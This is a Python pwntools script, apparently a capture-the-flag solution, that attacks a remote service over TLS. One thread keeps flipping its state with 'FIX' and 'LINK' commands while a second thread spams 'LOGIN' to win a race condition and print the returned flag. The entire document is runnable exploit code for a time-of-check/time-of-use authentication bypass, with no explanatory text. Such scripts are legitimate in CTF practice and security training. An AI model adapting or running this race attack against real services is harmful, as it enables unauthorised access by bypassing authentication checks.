from pwn import *
import threading, time

context.log_level = "error"

HOST = "link.cbc2025.cloud"
PORT = 443

def prime(io):
    io.recvuntil(b'> ')
    io.sendline(b'FIX')
    io.recvuntil(b'> ')

def flipper(stop):
    #io = process(['./link'])
    io = remote(HOST, PORT, ssl=True)
    prime(io)
    while not stop.is_set():
        io.sendline(b'FIX');  io.recvuntil(b'> ')
        io.sendline(b'LINK'); io.recvuntil(b'> ')
        time.sleep(0.001)
    io.close()

def racer(stop):
    #io = process(['./link'])
    io = remote(HOST, PORT, ssl=True)
    io.recvuntil(b'> ')
    while not stop.is_set():
        io.sendline(b'LOGIN')
        data = io.recvuntil(b'> ', timeout=0.5) or b''
        if b'flag:' in data:
            print(data.decode(errors='ignore').split('flag: ')[1].splitlines()[0])
            stop.set()
            break
    io.close()

if __name__ == "__main__":
    stop = threading.Event()
    t1 = threading.Thread(target=flipper, args=(stop,), daemon=True)
    t2 = threading.Thread(target=racer,   args=(stop,), daemon=True)
    t1.start(); t2.start()
    for _ in range(200):
        if stop.is_set(): break
        time.sleep(0.05)
    if not stop.is_set(): print("race missed; rerun or bump SLEEP_MS")
    stop.set()
